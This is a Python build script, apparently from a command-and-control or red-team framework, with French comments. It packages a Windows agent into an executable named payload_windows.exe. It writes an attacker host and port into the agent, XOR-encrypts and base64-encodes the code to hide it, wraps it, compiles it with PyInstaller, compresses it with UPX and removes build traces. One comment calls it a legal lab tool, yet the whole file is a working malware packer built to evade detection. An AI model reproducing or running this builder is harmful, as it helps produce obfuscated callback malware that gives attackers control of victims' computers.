# build/packager.py

import os
import random
import string
import subprocess
import base64
import shutil

# 📦 Import config globale
try:
    from core.config import LHOST, LPORT
except:
    LHOST, LPORT = "127.0.0.1", 4444  # fallback si .env non chargé

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
AGENT_FILE = os.path.join(BASE_DIR, "agents", "windows", "agent_win.py")
WRAPPER_TEMPLATE = os.path.join(BASE_DIR, "build", "template_wrapper.py")
WRAPPER_OUTPUT = os.path.join(BASE_DIR, "build", "temp_wrapper.py")
OUTPUT_DIR = os.path.join(BASE_DIR, "build", "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

XOR_KEY = 13  # Clé de chiffrement simple pour lab légal

def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def xor_encrypt(data, key):
    return ''.join([chr(ord(c) ^ key) for c in data])

def inject_wrapper(encoded_payload, xor_key):
    with open(WRAPPER_TEMPLATE, "r", encoding="utf-8") as f:
        template = f.read()

    wrapper_final = template.replace("<ENCRYPTED_B64_PAYLOAD>", f'"{encoded_payload}"')
    wrapper_final = wrapper_final.replace("XOR_KEY = 13", f"XOR_KEY = {xor_key}")

    with open(WRAPPER_OUTPUT, "w", encoding="utf-8") as f:
        f.write(wrapper_final)

    print("[✔] Wrapper injecté avec le payload.")

def compile_exe(output_name="payload_windows.exe", icon_path=None, compress=True):
    cmd = [
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--clean",
        "--name", output_name.replace(".exe", ""),
        "--distpath", OUTPUT_DIR,
        WRAPPER_OUTPUT
    ]

    if icon_path and os.path.exists(icon_path):
        cmd += ["--icon", icon_path]

    print("[*] Compilation avec PyInstaller...")
    subprocess.run(cmd, check=True)

    exe_path = os.path.join(OUTPUT_DIR, output_name)

    if compress:
        print("[*] Compression UPX...")
        subprocess.run(["upx", "--best", "--lzma", exe_path], check=True)

    print(f"[✔] Payload final généré : {exe_path}")

def clean():
    for item in ["build", "__pycache__", WRAPPER_OUTPUT]:
        path = os.path.join(BASE_DIR, item) if item != WRAPPER_OUTPUT else item
        if os.path.exists(path):
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
    for f in os.listdir(BASE_DIR):
        if f.endswith(".spec"):
            os.remove(os.path.join(BASE_DIR, f))

def main():
    print("[*] Lecture de l'agent...")
    with open(AGENT_FILE, "r", encoding="utf-8") as f:
        code = f.read()

    # 🔁 Remplacement dynamique LHOST / LPORT avant chiffrement
    code = code.replace("LHOST_PLACEHOLDER", f'"{LHOST}"')
    code = code.replace("LPORT_PLACEHOLDER", f"{LPORT}")

    print("[*] Chiffrement XOR + encodage base64...")
    encrypted = xor_encrypt(code, XOR_KEY)
    encoded = base64.b64encode(encrypted.encode()).decode()

    print("[*] Injection du wrapper...")
    inject_wrapper(encoded, XOR_KEY)

    print("[*] Compilation...")
    compile_exe()

    print("[*] Nettoyage...")
    clean()

    print("[✔] Payload prêt dans : build/output/")

if __name__ == "__main__":
    main()
